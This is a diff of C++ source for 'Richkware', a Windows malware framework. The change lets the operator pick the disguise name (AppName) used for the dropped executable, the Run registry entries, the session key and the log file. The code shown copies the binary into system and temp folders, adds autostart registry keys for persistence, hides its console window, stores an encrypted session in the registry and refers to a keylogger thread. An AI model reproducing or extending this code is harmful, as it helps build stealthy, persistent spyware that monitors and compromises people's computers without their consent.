@@ -102,18 +102,18 @@ void Richkware::Persistance() {
 	GetTempPath(MAX_PATH, tmp_path);
 	strcat(tmp_path_reg, tmp_path);
 
-	strcat(system_path_reg, "\\winresumer.exe\" /noshow");
-	strcat(system_path, "\\winresumer.exe");
+	strcat(system_path_reg, ("\\" + AppName + ".exe\" /noshow").c_str());
+	strcat(system_path, ("\\" + AppName + ".exe").c_str());
 	CopyFile(file_path, system_path, true);
 
-	strcat(tmp_path_reg, "winresumer.exe\" /noshow");
-	strcat(tmp_path, "winresumer.exe");
+	strcat(tmp_path_reg, (AppName + ".exe\" /noshow").c_str());
+	strcat(tmp_path, (AppName + ".exe").c_str());
 	CopyFile(file_path, tmp_path, true);
 
 	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-		"Windows1", system_path_reg);
+		(AppName + "1").c_str(), system_path_reg);
 	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-		"Windows2", tmp_path_reg);
+		(AppName + "2").c_str(), tmp_path_reg);
 
 }
 
@@ -270,7 +270,7 @@ DWORD WINAPI ClientSocketThread(void* arg) {
 	std::stringstream ss;
 	ss << rand(); // An integer value between 0 and RAND_MAX
 
-	std::string fileName = "Windows" + ss.str();
+	std::string fileName = ss.str();
 	char tmp_path[MAX_PATH];
 	GetTempPath(MAX_PATH, tmp_path);
 	std::string fileBat = tmp_path;
@@ -480,7 +480,7 @@ void Richkware::SaveSession(const char* EncryptionKey) {
 
 	sessionString = EncryptDecrypt(sessionString, EncryptionKey);
 
-	SaveValueReg("Software\\Microsoft\\Windows", "Windows",
+	SaveValueReg("Software\\Microsoft\\Windows", AppName.c_str(),
 		sessionString.c_str());
 	SaveValueToFile(sessionString.c_str());
 
@@ -488,7 +488,7 @@ void Richkware::SaveSession(const char* EncryptionKey) {
 
 void Richkware::LoadSession(const char* EncryptionKey) {
 	std::string sessionString;
-	sessionString = LoadValueReg("Software\\Microsoft\\Windows", "Windows");
+	sessionString = LoadValueReg("Software\\Microsoft\\Windows", AppName.c_str());
 	if (sessionString.empty()) {
 		sessionString = LoadValueFromFile();
 	}
@@ -521,7 +521,7 @@ void Richkware::LoadSession(const char* EncryptionKey) {
 
 
 void Richkware::SaveValueToFile(const char* value, const char * path) {
-	std::string fileName = "Windows.log";
+	std::string fileName = (AppName + ".log").c_str();
 	std::string filePath;
 
 	// save in temp folder
@@ -548,7 +548,7 @@ void Richkware::SaveValueToFile(const char* value, const char * path) {
 }
 
 std::string Richkware::LoadValueFromFile(const char* path) {
-	std::string fileName = "Windows.log";
+	std::string fileName = (AppName + ".log").c_str();
 	std::string filePath;
 
 	// save in temp folder
@@ -661,7 +661,7 @@ KeyloggerThread(void* arg) {
 
 // verify the existence of malware session.
 bool Richkware::CheckSession() {
-	if (!(LoadValueReg("Software\\Microsoft\\Windows", "Windows").empty()))
+	if (!(LoadValueReg("Software\\Microsoft\\Windows", AppName.c_str()).empty()))
 		return true;
 	return false;
 }
@@ -677,15 +677,15 @@ bool Richkware::CheckPersistance() {
 	GetModuleFileName(module_handler, file_path, MAX_PATH);
 	GetSystemDirectory(system_path, MAX_PATH);
 	GetTempPath(MAX_PATH, tmp_path);
-	strcat(system_path, "\\winresumer.exe");
-	strcat(tmp_path, "winresumer.exe");
+	strcat(system_path, ("\\" + AppName + ".exe").c_str());
+	strcat(tmp_path, (AppName + ".exe").c_str());
 	std::ifstream fileSys(system_path);
 	std::ifstream fileTmp(tmp_path);
 
 	// ((persTmpREG && persTmpFILE) || (persTmpSYS && persTmpSYS))
-	if ((!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows1").empty()) &&
+	if ((!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (AppName + "1").c_str()).empty()) &&
 		(fileSys.is_open())) ||
-		(!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows2").empty()) &&
+		(!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (AppName + "2").c_str()).empty()) &&
 		(fileTmp.is_open()))) b = true;
 
 	fileSys.close();
@@ -694,12 +694,13 @@ bool Richkware::CheckPersistance() {
 	return b;
 }
 
-void Richkware::Initialize(const char* EncryptionKeyArg) {
+void Richkware::Initialize(const char* AppNameArg, const char* EncryptionKeyArg) {
 
-	system("title Windows");
-	StealthWindow("Windows");
+	AppName = AppNameArg;
+	system(("title " + AppName).c_str());
+	StealthWindow(AppName.c_str());
 	EncryptionKey = EncryptionKeyArg;
-
+/*
 	if (!(CheckSession()) && !(CheckPersistance())) {	// first run
 		SaveInfo("FirstRun", "false");
 		Persistance();
@@ -711,7 +712,7 @@ void Richkware::Initialize(const char* EncryptionKeyArg) {
 	else if (!(CheckPersistance())) {	// Y session, N pers
 		SaveInfo("TmpSysCleaner", "true");
 		Persistance();
-	}
+	}*/
 
 	// metti check per ogni cosa registro o file in modo da sapere se ha qualcosa che controlla il registro o qualcosa che effettui pulizie o un antivirus
 
